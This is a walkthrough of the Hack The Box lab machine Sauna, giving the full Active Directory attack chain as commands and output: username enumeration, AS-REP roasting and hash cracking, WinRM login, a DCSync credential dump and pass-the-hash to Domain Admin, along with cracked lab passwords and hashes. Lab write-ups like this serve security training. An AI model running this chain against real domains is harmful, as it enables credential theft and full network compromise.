---
title: "Hack The Box — Sauna Walkthrough"
date: 2025-12-10 
categories: [HackTheBox, Active Directory,]
tags: [htb, sauna, active-directory, asrep-roasting, kerbrute, bloodhound, dcsync, windows]
image:
  path: /assets/sauna/cover.png
---

## 🖥 Machine Overview

- **Name:** Sauna
- **Platform:** Hack The Box
- **Difficulty:** Easy
- **Category:** Active Directory
- **Tech Stack:** Windows Server, Kerberos, Active Directory

Sauna is a beginner-friendly Active Directory machine that demonstrates:

- Username enumeration
- AS-REP Roasting
- Kerberos abuse
- BloodHound privilege escalation
- DCSync attack
- Pass-the-Hash

---

# 🔎 Enumeration

## 🌐 Port Scan

Port 80 (HTTP) was open.

The website displayed employee names — a very important clue for Active Directory enumeration.

![Web Page](/assets/sauna/1.png)

---

## 📂 Directory Bruteforcing

```bash
ffuf -u http://10.129.26.205/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-e .php,.txt,.bak,.zip,.html,.asp,.aspx,.js
```


This helped enumerate additional files on the web server.
![Web Page](/assets/sauna/3.png)


### 👤 Username Generation

The website revealed employee names.

![Web Page](/assets/sauna/2.png)

Common AD username patterns include:
```shell
firstname.lastname

firstinitiallastname

firstname

Variants with numbers
```
Important AD fields:

sAMAccountName → legacy logon name

UserPrincipalName (UPN) → email-style login

Based on discovered names, I generated a large username wordlist.

```shell 
admin
administrator
administrator1
root
guest
test
test1
user
user1
helpdesk
it
itadmin
it.support
backup
backupadmin
security
svc
svc_admin
svc_backup
svc_it
svc_web
svc_db
monitor
monitoring
service
support
support1
supervisor
operator
ops
opsadmin
sysadmin
network
networkadmin
fergussmith
fergus.smith
fsmith
f.smith
smithf
ferguss
fsmith1
fergus.smith1
fsmith01
fsmith2024
fergus.smith@egotistical-bank.local
fsmith@egotistical-bank.local
fergus_smith
fergus-smith
fergus.s
fs
f_smith
shauncoins
shaun.coins
scoins
s.coins
coinss
shaunc
scoins1
shaun.coins1
scoins01
scoins2024
shaun.coins@egotistical-bank.local
scoins@egotistical-bank.local
shaun_coins
shaun-coins
shaun.c
sc
s_coins

# === Sophie Driver ===

sophiedriver
sophie.driver
sdriver
s.driver
drivers
sophied
sdriver1
sophie.driver1
sdriver01
sdriver2024
sophie.driver@egotistical-bank.local
sdriver@egotistical-bank.local
sophie_driver
sophie-driver
sophie.d
sd
s_driver

# === Bowie Taylor ===

bowietaylor
bowie.taylor
btaylor
b.taylor
taylorb
bowiet
btaylor1
bowie.taylor1
btaylor01
btaylor2024
bowie.taylor@egotistical-bank.local
btaylor@egotistical-bank.local
bowie_taylor
bowie-taylor
bowie.t
bt
b_taylor

# === Hugo Bear ===

hugobear
hugo.bear
hbear
h.bear
bearh
hugob
hbear1
hugo.bear1
hbear01
hbear2024
hugo.bear@egotistical-bank.local
hbear@egotistical-bank.local
hugo_bear
hugo-bear
hugo.b
hb
h_bear

# === Steven Kerb ===

stevenkerb
steven.kerb
skerb
s.kerb
kerbs
stevenk
skerb1
steven.kerb1
skerb01
skerb2024
steven.kerb@egotistical-bank.local
skerb@egotistical-bank.local
steven_kerb
steven-kerb
steven.k
sk
s_kerb
```

🎯 Kerberos User Enumeration

Using Kerbrute:
```shell
kerbrute userenum --dc 10.129.26.205 \
-d EGOTISTICAL-BANK.LOCAL users.txt
```

Valid users discovered:
```shell
administrator@EGOTISTICAL-BANK.LOCAL
fsmith@EGOTISTICAL-BANK.LOCAL
```

![Web Page](/assets/sauna/4.png)


## 🔥 AS-REP Roasting

User fsmith had Do not require Kerberos pre-authentication enabled.

Captured AS-REP hash:
```shell
echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:HASH...' > fsmith.hash
```

Cracked using John:
```shell
john fsmith.hash --wordlist=/usr/share/wordlists/rockyou.txt
john fsmith.hash --show
```
![Web Page](/assets/sauna/5.png)

Password recovered:
```shell
Thestrokes23
```

### 💻 Initial Access (WinRM)
```shell
evil-winrm -i 10.129.26.205 -u fsmith -p 'Thestrokes23'
```
User flag:
```shell
cat user.txt
```

## 🧠 Domain Enumeration

Using Impacket:
```shell
GetADUsers.py -all -dc-ip 10.129.26.205 EGOTISTICAL-BANK.LOCAL/fsmith
```
```shell
Administrator                                        Guest                                                krbtgt                                               HSmith                                               FSmith                                               
svc_loanmgr                                          
```
### Discovered service account:
```shell
svc_loanmgr
```

## 🔍 Privilege Escalation
### 🔎 winPEAS Enumeration

Uploaded winPEAS:
```shell
upload /home/kali/TOOLS/winPEASx64.exe
```
![Web Page](/assets/sauna/6.png)

Discovered AutoLogon credentials:
```shell
DefaultUserName : EGOTISTICALBANK\svc_loanmanager
DefaultPassword : Moneymakestheworldgoround!
```

## 🔄 Lateral Movement

Logged in as service account:
```shell
evil-winrm -i 10.129.26.205 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
## 🩸 BloodHound Analysis

Uploaded SharpHound:

```shell

upload /home/kali/TOOLS/SharpHound.exe
```

Collected domain data:

```shell
.\SharpHound.exe -c All
```
![Web Page](/assets/sauna/7.png)

Downloaded results and imported into BloodHound CE.

Analysis revealed DCSync privileges for svc_loanmgr.

🧬 DCSync Attack

Using Impacket:
```shell

secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.129.26.205 -just-dc-user Administrator
```
![Web Page](/assets/sauna/8.png)

Retrieved Administrator hashes:

```shell
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
```

🗝 Pass-the-Hash
```shell
evil-winrm -i 10.129.26.205 \
-u Administrator \
-H 823452073d75b9d1cf70ebdf86c7f98e
```
Root flag:

```shell
cat root.txt
```

# 🧠 Attack Chain Summary

Web enumeration → Employee names

Username generation

Kerbrute user enumeration

AS-REP Roasting (fsmith)

WinRM access

winPEAS → AutoLogon credentials

BloodHound privilege discovery

DCSync attack

Pass-the-Hash → Domain Admin

# 🏁 Final Thoughts

Sauna is a perfect introduction to:

Kerberos misconfigurations

AS-REP Roasting

Active Directory privilege escalation

BloodHound analysis

DCSync abuse

It demonstrates how a small misconfiguration (pre-auth disabled) can lead to full domain compromise.

## Happy Hacking 👾

